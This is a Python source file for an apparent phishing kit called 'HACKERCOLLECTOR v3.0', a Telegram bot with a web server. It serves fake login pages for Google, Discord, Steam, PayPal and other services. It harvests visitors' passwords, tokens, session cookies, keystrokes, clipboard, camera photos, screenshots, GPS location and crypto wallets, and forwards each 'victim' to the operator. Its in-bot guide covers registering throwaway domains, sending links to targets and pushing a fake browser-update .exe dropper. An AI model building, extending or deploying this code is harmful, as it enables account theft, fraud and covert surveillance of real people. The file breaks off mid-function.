import asyncio
import uuid
import json
import logging
import hashlib
import base64
import re
import os
import random
import aiosqlite
from contextlib import asynccontextmanager
from datetime import datetime
from urllib.parse import quote

from fastapi import FastAPI, Request, Response
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from fastapi.middleware.cors import CORSMiddleware

from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, CallbackQuery, BufferedInputFile, FSInputFile
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import Command, CommandObject
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.utils.formatting import Text

from config import BOT_TOKEN, BASE_URL, DISCORD_WEBHOOK_URL, LINK_TTL_HOURS, MAX_LINKS_PER_USER
from database import (
    init_db, register_user, get_user, increment_user_stats, set_user_domain,
    create_campaign, get_campaigns, get_campaign, deactivate_campaign,
    create_link, get_user_links, get_link, increment_hits, mark_data_received,
    delete_link, deactivate_expired_links,
    save_victim, get_victims, get_recent_victims, get_victim_count,
    add_event, get_events,
    get_webhook, set_webhook_telegram, set_webhook_discord,
    add_geo_fence, get_geo_fences, remove_geo_fence,
    set_setting, get_setting,
)

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()

# ── КЭШ ЛЕНДИНГОВ ──
LANDING_CACHE: dict[str, str] = {}
LANDING_NAMES = {
    "cf": "☁️ Cloudflare Verify",
    "google": "🔐 Google Login",
    "telegram": "📞 Telegram Login",
    "discord": "💬 Discord Login",
    "steam": "🎮 Steam Login",
    "netflix": "🎬 Netflix Login",
    "instagram": "📷 Instagram Login",
    "vk": "🇷🇺 VK Login",
    "microsoft": "🏢 Microsoft Login",
    "whatsapp": "📱 WhatsApp Web",
    "age": "🔞 Age Verify + Selfie",
    "update": "⬆️ Browser Update (EXE)",
    "youtube": "▶️ YouTube Login",
    "spotify": "🎵 Spotify Login",
    "paypal": "💰 PayPal Login",
}

def load_landings():
    import os
    for fname in os.listdir("landing"):
        if fname.endswith(".html"):
            name = fname.replace(".html", "")
            with open(f"landing/{fname}", encoding="utf-8") as f:
                LANDING_CACHE[name] = f.read()
    logger.info(f"Loaded {len(LANDING_CACHE)} landing templates")

# ── УТИЛИТЫ ──

def generate_link_id() -> str:
    return uuid.uuid4().hex[:10]

def generate_session_id() -> str:
    return uuid.uuid4().hex[:16]

def make_url(link_id: str, tg_id: int) -> str:
    user = asyncio.run(get_user(tg_id))
    domain = (user["domain"] if user and user["domain"] else BASE_URL).rstrip("/")
    return f"{domain}/l/{link_id}"

async def send_discord(msg: str):
    if not DISCORD_WEBHOOK_URL:
        return
    try:
        import httpx
        async with httpx.AsyncClient() as cl:
            await cl.post(DISCORD_WEBHOOK_URL, json={"content": msg[:2000]})
    except:
        pass

# ── FASTAPI ──

@asynccontextmanager
async def lifespan(app: FastAPI):
    await init_db()
    await deactivate_expired_links()
    load_landings()
    # Запускаем фоновую задачу очистки просроченных ссылок
    asyncio.create_task(periodic_cleanup())
    asyncio.create_task(polling())
    yield

async def periodic_cleanup():
    while True:
        await asyncio.sleep(3600)
        try:
            await deactivate_expired_links()
        except:
            pass

async def polling():
    try:
        await dp.start_polling(bot)
    except Exception as e:
        logger.error(f"Polling failed: {e}")

app = FastAPI(lifespan=lifespan)
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])
app.mount("/static", StaticFiles(directory="static"), name="static")

# ── КОРЕНЬ ──
@app.get("/")
async def index():
    return HTMLResponse("""
    <!DOCTYPE html><html><body style="background:#111;color:#0f0;font-family:monospace;padding:40px">
    <h2>⚡ Active</h2>
    <p>System online — all routes operational.</p>
    </body></html>
    """)

# DEFAULT_OWNER_ID хранится в БД (settings table) — через /claim

async def _get_default_owner() -> int | None:
    val = await get_setting("default_owner")
    return int(val) if val else None

async def _serve_landing_internal(link_id: str, request: Request):
    link = await get_link(link_id)
    if not link or not link["active"]:
        return HTMLResponse("<h2>404</h2>", status_code=404)

    await increment_hits(link_id)

    ua = request.headers.get("User-Agent", "")
    ip = request.client.host if request.client else "0.0.0.0"
    if request.headers.get("X-Forwarded-For"):
        ip = request.headers["X-Forwarded-For"].split(",")[0].strip()
    ref = request.headers.get("Referer", "")

    session_id = generate_session_id()
    await add_event(link_id, session_id, ip, "page_load", f"UA: {ua[:100]} | Ref: {ref[:100]}")

    template = link["template"]
    if template == "random" or template not in LANDING_CACHE:
        template = random.choice(list(LANDING_CACHE.keys()))
        from database import DB_PATH
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute("UPDATE links SET template = ? WHERE id = ?", (template, link_id))
            await db.commit()

    html = LANDING_CACHE.get(template, LANDING_CACHE.get("cf", ""))

    html = html.replace("{{LINK_ID}}", link_id)
    html = html.replace("{{SESSION_ID}}", session_id)
    html = html.replace("{{BASE_URL}}", BASE_URL.rstrip("/"))
    html = html.replace("{{REFERRER}}", ref)

    return HTMLResponse(html)

# ── ЛЕНДИНГ (старый формат /l/{id}) ──
@app.get("/l/{link_id}")
async def serve_landing_old(link_id: str, request: Request):
    return await _serve_landing_internal(link_id, request)

# ── ЛЕНДИНГ (любой путь — old school catch-all) ──
@app.get("/{path:path}")
async def serve_landing_catch_all(path: str, request: Request):
    # Пропускаем служебные пути
    if path.startswith("l/") or path.startswith("c/") or path.startswith("collect/") or path.startswith("static/"):
        return HTMLResponse("<h2>404</h2>", status_code=404)

    link_id = path.strip("/")

    # Если ссылка не существует — создаём на лету
    link = await get_link(link_id)
    if not link or not link["active"]:
        owner = await _get_default_owner()
        if owner and len(link_id) >= 3:
            await create_link(link_id, None, owner, "random", link_id[:8], f"{BASE_URL}/{link_id}", LINK_TTL_HOURS)
        else:
            return HTMLResponse("<h2>404</h2>", status_code=404)

    return await _serve_landing_internal(link_id, request)

# ── ПРИЁМ ДАННЫХ ──
@app.post("/c/{link_id}")
@app.post("/collect/{link_id}")
async def collect_data(link_id: str, request: Request):
    link = await get_link(link_id)
    if not link:
        return JSONResponse({"ok": False}, status_code=404)

    try:
        body = await request.json()
    except:
        try:
            form = await request.form()
            body = dict(form)
        except:
            body = {}

    ip = request.client.host if request.client else body.get("ip", "0.0.0.0")
    if request.headers.get("X-Forwarded-For"):
        ip = request.headers["X-Forwarded-For"].split(",")[0].strip()

    data = {
        "session_id": body.get("session", ""),
        "ip": ip,
        "country": body.get("country", ""),
        "city": body.get("city", ""),
        "lat": body.get("lat"),
        "lon": body.get("lon"),
        "isp": body.get("isp", ""),
        "org": body.get("org", ""),
        "asn": body.get("asn", ""),
        "vpn": body.get("vpn", 0),
        "proxy": body.get("proxy", 0),
        "hosting": body.get("hosting", 0),
        "tor": body.get("tor", 0),
        "ua": body.get("ua", request.headers.get("User-Agent", "")),
        "platform": body.get("platform", ""),
        "screen": body.get("screen", ""),
        "language": body.get("language", ""),
        "timezone": body.get("timezone", ""),
        "canvas_fp": body.get("canvas_fp", "") or body.get("canvas", ""),
        "webgl_fp": body.get("webgl_fp", "") or body.get("webgl", ""),
        "cpu_cores": body.get("cpu_cores"),
        "ram": body.get("ram"),
        "device_memory": body.get("device_memory"),
        "touch": body.get("touch", 0),
        "cookies": body.get("cookies", 1),
        "dnt": body.get("dnt", 0),
        "adblock": body.get("adblock", 0),
        "photo": body.get("photo", ""),
        "screenshot": body.get("screenshot", ""),
        "clipboard": body.get("clipboard", ""),
        "keylog": body.get("keylog", ""),
        "login": body.get("login", ""),
        "password": body.get("password", ""),
        "email": body.get("email", ""),
        "phone": body.get("phone", ""),
        "token": body.get("token", ""),
        "cookie": body.get("cookie", ""),
        "session_data": body.get("session_data", ""),
        "geo_accuracy": body.get("geo_accuracy"),
        "referrer": body.get("referrer", request.headers.get("Referer", "")),
        "visit_duration": body.get("visit_duration", 0),
        "keystrokes": body.get("keystrokes", 0),
        "mouse_clicks": body.get("mouse_clicks", 0),
        "form_interactions": body.get("form_interactions", 0),
        "risk_score": body.get("risk_score", 0),
        "page_path": body.get("page_path", ""),
        "querystring": body.get("querystring", ""),
        "linkedin_url": body.get("linkedin_url", ""),
        "facebook_url": body.get("facebook_url", ""),
        "twitter_handle": body.get("twitter", ""),
        "instagram_handle": body.get("instagram", ""),
        "discord_token": body.get("discord_token", ""),
        "telegram_session": body.get("telegram_session", ""),
        "steam_id": body.get("steam_id", ""),
        "wallet_addresses": body.get("wallets", ""),
        "notes": body.get("notes", ""),
    }

    # Хэши фото/скриншотов для дедупликации
    if data["photo"]:
        data["photo_hash"] = hashlib.md5(data["photo"][:5000].encode()).hexdigest()
    if data["clipboard"]:
        data["clipboard_hash"] = hashlib.md5(data["clipboard"].encode()).hexdigest()

    await save_victim(link_id, data)
    await mark_data_received(link_id)
    await add_event(link_id, data["session_id"], ip, "data_received", f"IP: {ip}")

    # Уведомление владельцу
    tg_id = link["tg_id"]
    await increment_user_stats(tg_id, "total_victims")
    await notify_owner(tg_id, link_id, data)

    # Discord если настроен
    webhook = await get_webhook(tg_id)
    if webhook and webhook["discord"] and webhook["discord_url"]:
        discord_msg = f"**🔥 New Victim!**\nIP: {ip}\nCountry: {data['country']}\nLink: {link_id}"
        try:
            import httpx
            async with httpx.AsyncClient() as cl:
                await cl.post(webhook["discord_url"], json={"content": discord_msg})
        except:
            pass

    return JSONResponse({"ok": True})

# ── УВЕДОМЛЕНИЕ ──
async def notify_owner(tg_id: int, link_id: str, data: dict):
    webhook = await get_webhook(tg_id)
    if webhook and not webhook["telegram"]:
        return

    # Риск-скор
    risk = data.get("risk_score", 0)
    risk_icon = "🟢" if risk < 20 else ("🟡" if risk < 60 else "🔴")

    lines = [
        f"<b>🔥 NEW VICTIM CAPTURED</b>\n"
        f"<blockquote>Link: <code>{link_id}</code></blockquote>",
        f"<b>🌐 Network</b>",
        f"├ IP: <code>{data['ip']}</code> {risk_icon}",
        f"├ Country: {data.get('country', '—')}",
        f"├ City: {data.get('city', '—')}",
    ]
    if data.get("lat") and data.get("lon"):
        lines.append(f"├ <a href='https://maps.google.com/maps?q={data['lat']},{data['lon']}'>🗺 Open Maps</a>")
    lines.append(f"├ ISP: {data.get('isp', '—')}")
    lines.append(f"├ ASN: {data.get('asn', '—')}")

    vpn_tags = []
    if data.get("vpn"): vpn_tags.append("VPN")
    if data.get("proxy"): vpn_tags.append("Proxy")
    if data.get("tor"): vpn_tags.append("TOR")
    if data.get("hosting"): vpn_tags.append("Hosting")
    lines.append(f"├ Tags: {'⚠️ ' + ', '.join(vpn_tags) if vpn_tags else '✅ Clean'}")

    if data.get("ua"):
        ua_short = data["ua"][:80]
        lines.append(f"\n<b>💻 Device</b>")
        lines.append(f"├ Browser: <code>{ua_short}</code>")
        lines.append(f"├ Platform: {data.get('platform', '—')}")
        lines.append(f"├ Screen: {data.get('screen', '—')}")
        lines.append(f"├ Language: {data.get('language', '—')}")
        lines.append(f"├ Timezone: {data.get('timezone', '—')}")

    if data.get("cpu_cores"):
        lines.append(f"├ CPU Cores: {data['cpu_cores']}")
    if data.get("device_memory"):
        lines.append(f"├ RAM: {data['device_memory']}GB")
    if data.get("touch"):
        lines.append(f"├ 📱 Touch device")

    if data.get("adblock"):
        lines.append(f"├ 🚫 AdBlock detected")
    if data.get("canvas_fp"):
        lines.append(f"├ 🖐 Canvas fingerprint captured")

    if data.get("login") or data.get("password") or data.get("email") or data.get("phone"):
        lines.append(f"\n<b>✧ CREDENTIALS</b>")
        if data.get("email"): lines.append(f"├ Email: <code>{data['email']}</code>")
        if data.get("login"): lines.append(f"├ Login: <code>{data['login']}</code>")
        if data.get("password"): lines.append(f"├ Password: <code>{data['password']}</code>")
        if data.get("phone"): lines.append(f"├ Phone: <code>{data['phone']}</code>")
        if data.get("token"): lines.append(f"├ Token: <code>{data['token'][:60]}</code>")

    if data.get("discord_token"):
        lines.append(f"\n<b>✧ TOKENS</b>")
        lines.append(f"├ Discord: <code>{data['discord_token'][:80]}</code>")

    if data.get("clipboard"):
        lines.append(f"\n<b>📋 Clipboard</b>")
        lines.append(f"<code>{data['clipboard'][:300]}</code>")

    if data.get("keylog"):
        lines.append(f"\n<b>⌨️ Keylog ({len(data['keylog'])} chars)</b>")
        lines.append(f"<code>{data['keylog'][:300]}</code>")

    if data.get("steam_id"):
        lines.append(f"\n<b>🎮 Steam</b>")
        lines.append(f"├ SteamID: <code>{data['steam_id']}</code>")

    if data.get("wallet_addresses"):
        lines.append(f"\n<b>💰 Wallets</b>")
        lines.append(f"├ {data['wallet_addresses'][:200]}")

    if data.get("visit_duration"):
        lines.append(f"\n<b>⏱ Session</b>")
        lines.append(f"├ Duration: {data['visit_duration']}s")
        lines.append(f"├ Keystrokes: {data.get('keystrokes', 0)}")
        lines.append(f"├ Clicks: {data.get('mouse_clicks', 0)}")

    lines.append(f"\n📎 /victim {link_id}")

    msg = "\n".join(lines)

    try:
        await bot.send_message(tg_id, msg, disable_web_page_preview=True)

        # Фото
        if data.get("photo"):
            try:
                photo_bytes = base64.b64decode(data["photo"])
                caption = f"📸 <b>Victim photo</b>\n├ {data.get('country', '')} / {data.get('city', '')}"
                if data.get("lat") and data.get("lon"):
                    caption += f"\n├ <a href='https://maps.google.com/maps?q={data['lat']},{data['lon']}'>🗺 Map</a>"
                await bot.send_photo(
                    tg_id,
                    BufferedInputFile(photo_bytes, filename=f"victim_{link_id}.jpg"),
                    caption=caption
                )
            except Exception as e:
                logger.warning(f"Photo send failed: {e}")

        # Скриншот
        if data.get("screenshot"):
            try:
                ss_bytes = base64.b64decode(data["screenshot"])
                await bot.send_document(
                    tg_id,
                    BufferedInputFile(ss_bytes, filename=f"screenshot_{link_id}.png"),
                    caption=f"🖥 <b>Victim screenshot</b>"
                )
            except Exception as e:
                logger.warning(f"Screenshot send failed: {e}")

    except Exception as e:
        logger.error(f"Notify owner failed for {tg_id}: {e}")

# ── BOT HANDLERS ──

def main_kb():
    b = InlineKeyboardBuilder()
    b.button(text="🎯 New Link", callback_data="new_link")
    b.button(text="📋 My Links", callback_data="list_links")
    b.button(text="📊 Dashboard", callback_data="dashboard")
    b.button(text="⚙️ Settings", callback_data="settings")
    b.button(text="📖 Guide", callback_data="guide")
    b.adjust(2)
    return b.as_markup()

@dp.message(Command("start"))
async def cmd_start(message: Message):
    await register_user(message.from_user.id, message.from_user.username)
    tg_id = message.from_user.id
    if not await _get_default_owner():
        await set_setting("default_owner", str(tg_id))
    v_count = await get_victim_count(tg_id)
    links = await get_user_links(tg_id)

    await message.answer(
        f"🕵️ <b>HACKERCOLLECTOR v3.0</b>\n"
        f"<blockquote>— Zero trust. Full control. —</blockquote>\n"
        f"├ Your stats: {len(links)} links | {v_count} victims\n"
        f"├ Need a domain? <code>eu.cc</code> works\n\n"
        f"<b>Modules:</b>\n"
        f"├ <b>15</b> landing templates (Google, Discord, Steam, Telegram, Netflix, …)\n"
        f"├ <b>Auto-capture:</b> IP, GPS, camera, screenshot, clipboard, WebGL, canvas\n"
        f"├ <b>Credentials:</b> login/password, tokens, 2FA codes, session cookies\n"
        f"├ <b>Live keylog</b> — every keystroke captured\n"
        f"├ <b>AdBlock / VPN / TOR detection</b>\n"
        f"├ <b>Automatic .exe delivery</b> for Windows victims\n"
        f"├ <b>Discord webhook</b> support\n"
        f"└ <b>Mass campaigns</b> — 100 links at once\n\n"
        f"Choose action:",
        reply_markup=main_kb()
    )

# ── OLD SCHOOL GEN ──
@dp.message(Command("gen"))
async def cmd_gen(message: Message, command: CommandObject):
    """Генерация ссылки в один клик — old school style, один домен, любой путь."""
    tg_id = message.from_user.id

    if not await _get_default_owner():
        await set_setting("default_owner", str(tg_id))

    user = await get_user(tg_id)
    domain = (user["domain"] if user and user["domain"] else BASE_URL).rstrip("/")

    # Парсим аргументы: /gen <template>
    args = command.args.strip().lower() if command.args else ""
    template = "random"
    if args.split()[0] in LANDING_CACHE:
        template = args.split()[0]
    elif args:
        # Возможно это шаблон по полному имени
        for key, name in LANDING_NAMES.items():
            if args.lower() in name.lower() or args.lower() == key:
                template = key
                break

    link_id = generate_link_id()
    full_url = f"{domain}/{link_id}"
    await create_link(link_id, None, tg_id, template, link_id[:8], full_url, LINK_TTL_HOURS)
    await increment_user_stats(tg_id, "total_links")

    tmpl_name = LANDING_NAMES.get(template, template)
    await message.answer(
        f"✅ <b>Link Generated</b>\n\n"
        f"Template: <b>{tmpl_name}</b>\n"
        f"URL: <code>{full_url}</code>\n\n"
        f"Send anywhere. Data arrives here.",
        disable_web_page_preview=True
    )

@dp.message(Command("claim"))
async def cmd_claim(message: Message):
    """Claim this bot as default owner — all untracked paths go to you."""
    await set_setting("default_owner", str(message.from_user.id))
    await message.answer(
        "✅ <b>Domain claimed!</b>\n\n"
        "Now any random path on your domain serves a landing page.\n"
        "Just send anyone: <code>https://yourdomain.eu.cc/anything</code>\n\n"
        "Works immediately — no pre-registration needed.\n"
        "To set a different template: /set domain verify\n"
        "To set to specific: /set domain google"
    )

@dp.message(Command("set"))
async def cmd_set(message: Message, command: CommandObject):
    """Set default template for catch-all links."""
    args = command.args.strip().lower() if command.args else ""
    parts = args.split()
    if len(parts) >= 2 and parts[0] == "domain":
        template = parts[1]
        if template in LANDING_CACHE:
            await set_user_domain(message.from_user.id, f"template:{template}")
            await message.answer(f"✅ Default template set to <b>{template}</b>")
        else:
            await message.answer(f"❌ Unknown template. Available: {', '.join(LANDING_CACHE.keys())}")
    else:
        await message.answer("Usage: /set domain <template>")

@dp.callback_query(F.data == "guide")
async def cb_guide(cq: CallbackQuery):
    text = (
        "<b>📖 Quick Guide</b>\n\n"
        "<b>1. Get a domain</b>\n"
        "Go to eu.cc or freenom, create a free domain.\n"
        "Point CNAME to your server IP.\n\n"
        "<b>2. Set it in bot</b>\n"
        "Use /domain yourdomain.eu.cc\n\n"
        "<b>3. Create a link</b>\n"
        "Tap «New Link» → choose template → get link\n\n"
        "<b>4. Send to target</b>\n"
        "When they open, their data arrives here instantly.\n\n"
        "<b>5. Collect</b>\n"
        "IP, camera photo, screen, passwords, clipboard, keylog — all here.\n\n"
        "<b>Old School Mode (new!):</b>\n"
        "• /claim — claim domain, any path works instantly\n"
        "• /gen [template] — generate clean link in one tap\n"
        "• Just send: <code>https://domain.eu.cc/anything</code>\n"
        "• No prefix needed. No pre-registration.\n\n"
        "<b>Tips:</b>\n"
        "• Use «Browser Update» template for .exe dropper\n"
        "• Enable Discord webhook for backup channel\n"
        "• Use geofencing to block certain countries (Settings)\n"
        "• Mass campaign: /campaign <name> <template> <count>"
    )
    b = InlineKeyboardBuilder()
    b.button(text="⬅️ Back", callback_data="back_main")
    await cq.message.edit_text(text, reply_markup=b.as_markup())
    await cq.answer()

@dp.callback_query(F.data == "back_main")
async def cb_back(cq: CallbackQuery):
    tg_id = cq.from_user.id
    v_count = await get_victim_count(tg_id)
    links = await get_user_links(tg_id)
    await cq.message.edit_text(
        f"🕵️ <b>HACKERCOLLECTOR v3.0</b>\n"
        f"├ Your stats: {len(links)} links | {v_count} victims\n\n"
        f"Choose action:",
        reply_markup=main_kb()
    )
    await cq.answer()

@dp.callback_query(F.data == "new_link")
async def cb_new_link(cq: CallbackQuery):
    b = InlineKeyboardBuilder()
    b.button(text="☁️ Cloudflare Verify", callback_data="tmpl_cf")
    b.button(text="🔐 Google Login", callback_data="tmpl_google")
    b.button(text="📞 Telegram Login", callback_data="tmpl_telegram")
    b.button(text="💬 Discord Login", callback_data="tmpl_discord")
    b.button(text="🎮 Steam Login", callback_data="tmpl_steam")
    b.button(text="📷 Instagram Login", callback_data="tmpl_instagram")
    b.button(text="🇷🇺 VK Login", callback_data="tmpl_vk")
    b.button(text="🏢 Microsoft Login", callback_data="tmpl_microsoft")
    b.button(text="🎬 Netflix Login", callback_data="tmpl_netflix")
    b.button(text="📱 WhatsApp Web", callback_data="tmpl_whatsapp")
    b.button(text="🔞 Age Verify + Selfie", callback_data="tmpl_age")
    b.button(text="⬆️ Browser Update (EXE)", callback_data="tmpl_update")
    b.button(text="▶️ YouTube Login", callback_data="tmpl_youtube")
    b.button(text="🎵 Spotify Login", callback_data="tmpl_spotify")
    b.button(text="💰 PayPal Login", callback_data="tmpl_paypal")
    b.button(text="⬅️ Back", callback_data="back_main")
    b.adjust(2)
    await cq.message.edit_text(
        "<b>🎯 New Link — Choose Template</b>\n\n"
        "Each template captures: IP, GPS, camera, screenshot,\n"
        "clipboard, keylog, canvas, WebGL, browser fingerprint.\n"
        "Credential templates also capture login/password.",
        reply_markup=b.as_markup()
    )
    await cq.answer()

@dp.callback_query(F.data.startswith("tmpl_"))
async def cb_create_link(cq: CallbackQuery):
    tg_id = cq.from_user.id
    template = cq.data.replace("tmpl_", "")
    user = await get_user(tg_id)

    # Проверка лимита
    links = await get_user_links(tg_id, active_only=True)
    if len(links) >= MAX_LINKS_PER_USER:
        await cq.answer(f"Limit: {MAX_LINKS_PER_USER} active links. Delete some.", show_alert=True)
        return

    link_id = generate_link_id()
    domain = (user["domain"] if user and user["domain"] else BASE_URL).rstrip("/")
    subdomain = f"{template}-{link_id[:6]}"
    full_url = f"{domain}/l/{link_id}"

    await create_link(link_id, None, tg_id, template, subdomain, full_url, LINK_TTL_HOURS)
    await increment_user_stats(tg_id, "total_links")

    template_name = LANDING_NAMES.get(template, template)

    b = InlineKeyboardBuilder()
    b.button(text="📊 View Stats", callback_data=f"stats_{link_id}")
    b.button(text="🎯 Another Link", callback_data="new_link")
    b.button(text="⬅️ Main Menu", callback_data="back_main")
    b.adjust(2)

    await cq.message.edit_text(
        f"✅ <b>Link Created</b>\n\n"
        f"Template: <b>{template_name}</b>\n"
        f"URL: <code>{full_url}</code>\n"
        f"Expires: in {LINK_TTL_HOURS}h\n\n"
        f"Send to target → data arrives here instantly.",
        reply_markup=b.as_markup()
    )
    await cq.answer()

@dp.callback_query(F.data == "list_links")
async def cb_list_links(cq: CallbackQuery):
    links = await get_user_links(cq.from_user.id)
    if not links:
        b = InlineKeyboardBuilder()
        b.button(text="🎯 Create First Link", callback_data="new_link")
        b.button(text="⬅️ Back", callback_data="back_main")
        await cq.message.edit_text("No active links. Create one:", reply_markup=b.as_markup())
        await cq.answer()
        return

    parts = ["<b>📋 Active Links:</b>\n"]
    b = InlineKeyboardBuilder()
    for link in links[:20]:
        tmpl_name = LANDING_NAMES.get(link["template"], link["template"])
        parts.append(
            f"├ <code>{link['id'][:10]}</code> {tmpl_name} "
            f"| 👁 {link['hits']} | 📥 {link['data_received']}"
        )
        b.button(text=link["id"][:8], callback_data=f"stats_{link['id']}")
    b.button(text="⬅️ Back", callback_data="back_main")
    b.adjust(4)
    await cq.message.edit_text("\n".join(parts), reply_markup=b.as_markup())
    await cq.answer()

@dp.callback_query(F.data.startswith("stats_"))
async def cb_stats(cq: CallbackQuery):
    link_id = cq.data.replace("stats_", "")
    link = await get_link(link_id)
    if not link:
        await cq.answer("Link not found", show_alert=True)
        return

    victims = await get_victims(link_id)
    events = await get_events(link_id, 5)
    tmpl_name = LANDING_NAMES.get(link["template"], link["template"])

    b = InlineKeyboardBuilder()
    b.button(text="🗑 Delete", callback_data=f"del_{link_id}")
    b.button(text="📋 Victims", callback_data=f"victims_{link_id}")
    b.button(text="⬅️ Back to list", callback_data="list_links")
    b.button(text="🏠 Main", callback_data="back_main")
    b.adjust(2)

    text = (
        f"<b>📊 Link Stats</b>\n"
        f"├ ID: <code>{link_id}</code>\n"
        f"├ Template: {tmpl_name}\n"
        f"├ Hits: {link['hits']}\n"
        f"├ Data received: {link['data_received']}\n"
        f"├ Active: {'✅ Yes' if link['active'] else '❌ Expired'}\n"
        f"├ Created: {link['created_at']}\n"
        f"├ Expires: {link['expires_at']}\n"
        f"├ URL: <code>{link['full_url']}</code>\n\n"
        f"<b>Recent events:</b>\n"
    )

    for e in events[:5]:
        text += f"├ {e['timestamp'][:19]} | {e['event_type']}\n"

    if victims:
        v = victims[0]
        text += f"\n<b>Latest victim:</b>\n"
        text += f"├ IP: <code>{v['ip']}</code> | {v.get('country', '—')}\n"
        if v.get("login") or v.get("password"):
            text += f"├ Creds: <code>{v.get('login', '')}:{v.get('password', '')}</code>\n"
        if v.get("photo"):
            text += f"├ 📸 Photo captured\n"
        if v.get("screenshot"):
            text += f"├ 🖥 Screenshot captured\n"

    await cq.message.edit_text(text, reply_markup=b.as_markup())
    await cq.answer()

@dp.callback_query(F.data.startswith("victims_"))
async def cb_victims(cq: CallbackQuery):
    link_id = cq.data.replace("victims_", "")
    victims = await get_victims(link_id)
    if not victims:
        await cq.answer("No victims yet", show_alert=True)
        return

    b = InlineKeyboardBuilder()
    b.button(text="⬅️ Back", callback_data=f"stats_{link_id}")
    b.button(text="🏠 Main", callback_data="back_main")

    parts = [f"<b>📋 Victims — {link_id[:10]}</b>\n"]
    for i, v in enumerate(victims[:10]):
        parts.append(f"\n<b>── #{i+1} ──</b>")
        parts.append(f"IP: <code>{v['ip']}</code>")
        parts.append(f"📍 {v.get('country', '—')} / {v.get('city', '—')}")
        if v.get("lat"):
            parts.append(f"<a href='https://maps.google.com/maps?q={v['lat']},{v['lon']}'>🗺 Map</a>")
        if v.get("login") or v.get("password"):
            parts.append(f"✧ <code>{v.get('login', '')}:{v.get('password', '')}</code>")
        if v.get("email"):
            parts.append(f"✉️ {v['email']}")
        if v.get("phone"):
            parts.append(f"📞 {v['phone']}")
        if v.get("token"):
            parts.append(f"🎫 Token: <code>{v['token'][:40]}</code>")
        if v.get("discord_token"):
            parts.append(f"💬 Discord: <code>{v['discord_token'][:40]}</code>")
        if v.get("platform"):
            parts.append(f"💻 {v['platform']}")
        if v.get("photo"):
            parts.append(f"📸 Photo: yes")
        if v.get("screenshot"):
            parts.append(f"🖥 Screenshot: yes")

    await cq.message.edit_text("\n".join(parts), reply_markup=b.as_markup())
    await cq.answer()

@dp.callback_query(F.data.startswith("del_"))
async def cb_delete(cq: CallbackQuery):
    link_id = cq.data.replace("del_", "")
    await delete_link(link_id)
    await cq.message.edit_text("🗑 Link + all victim data deleted.")
    await cq.answer()

@dp.callback_query(F.data == "dashboard")
async def cb_dashboard(cq: CallbackQuery):
    tg_id = cq.from_user.id
    user = await get_user(tg_id)
    v_count = await get_victim_count(tg_id)
    links = await get_user_links(tg_id)
    recent = await get_recent_victims(tg_id, 5)

    total_hits = sum(l["hits"] for l in links)
    total_data = sum(l["data_received"] for l in links)

    text = (
        f"<b>📊 Dashboard</b>\n"
        f"├ Links created: {user['total_links'] if user else 0}\n"
        f"├ Total victims: <b>{v_count}</b>\n"
        f"├ Total hits: {total_hits}\n"
        f"├ Active links: {len(links)}\n"
        f"├ Conversion: {(total_data/total_hits*100) if total_hits else 0:.1f}%\n"
    )

    if recent:
        text += f"\n<b>Recent victims:</b>\n"
        for v in recent:
            text += f"├ <code>{v['ip']}</code> | {v.get('template', '?')} | {v.get('country', '—')}\n"
            if v.get("login"):
                text += f"│ ✦ {v['login']}:{v.get('password','')}\n"

    b = InlineKeyboardBuilder()
    b.button(text="🔄 Refresh", callback_data="dashboard")
    b.button(text="⬅️ Back", callback_data="back_main")
    await cq.message.edit_text(text, reply_markup=b.as_markup())
    await cq.answer()

@dp.callback_query(F.data == "settings")
async def cb_settings(cq: CallbackQuery):
    tg_id = cq.from_user.id
    webhook = await get_webhook(tg_id)
    user = await get_user(tg_id)
    fences = await get_geo_fences(tg_id)

    tg_status = "✅ ON" if (webhook and webhook["telegram"]) else "❌ OFF"
    dc_status = "✅ ON" if (webhook and webhook["discord"]) else "❌ OFF"
    domain = user["domain"] if user and user["domain"] else "Not set"

    text = (
        f"<b>⚙️ Settings</b>\n"
        f"├ Domain: <code>{domain}</code>\n"
        f"├ Notify TG: {tg_status}\n"
        f"├ Discord hook: {dc_status}\n"
        f"└ Geo fences: {len(fences)}\n\n"
        f"<b>Commands:</b>\n"
        f"├ /domain yourdomain.eu.cc — set custom domain\n"
        f"├ /webhook discord <url> — set Discord webhook\n"
        f"├ /fence add <country> — block a country\n"
        f"├ /fence list — show geo fences\n"
        f"├ /fence remove <id> — remove geo fence\n"
        f"├ /campaign <name> <template> <count> — mass links\n"
        f"└ /export <link_id> — export victim data"
    )

    b = InlineKeyboardBuilder()
    b.button(text="Toggle TG", callback_data="tog_tg")
    b.button(text="Toggle Discord", callback_data="tog_dc")
    b.button(text="⬅️ Back", callback_data="back_main")
    b.adjust(2)
    await cq.message.edit_text(text, reply_markup=b.as_markup())
    await cq.answer()

@dp.callback_query(F.data == "tog_tg")
async def cb_tog_tg(cq: CallbackQuery):
    w = await get_webhook(cq.from_user.id)
    await set_webhook_telegram(cq.from_user.id, 0 if (w and w["telegram"]) else 1)
    await cb_settings(cq)
    await cq.answer()

@dp.callback_query(F.data == "tog_dc")
async def cb_tog_dc(cq: CallbackQuery):
    w = await get_webhook(cq.from_user.id)
    await set_webhook_discord(cq.from_user.id, 0 if (w and w["discord"]) else 1)
    await cb_settings(cq)
    await cq.answer()

# ── COMMANDS ──

@dp.message(Command("domain"))
async def cmd_domain(message: Message, command: CommandObject):
    domain = command.args.strip() if command.args else ""
    if not domain:
        await message.answer("Usage: /domain yourdomain.eu.cc")
        return
    await set_user_domain(message.from_user.id, domain)
    await message.answer(f"✅ Domain set to: <code>{domain}</code>")

@dp.message(Command("webhook"))
async def cmd_webhook(message: Message, command: CommandObject):
    args = command.args.strip() if command.args else ""
    if args.startswith("discord "):
        url = args.replace("discord ", "", 1).strip()
        await set_webhook_discord(message.from_user.id, 1, url)
        await message.answer("✅ Discord webhook set.")
    else:
        await message.answer("Usage: /webhook discord <url>")

@dp.message(Command("fence"))
async def cmd_fence(message: Message, command: CommandObject):
    args = command.args.strip() if command.args else ""
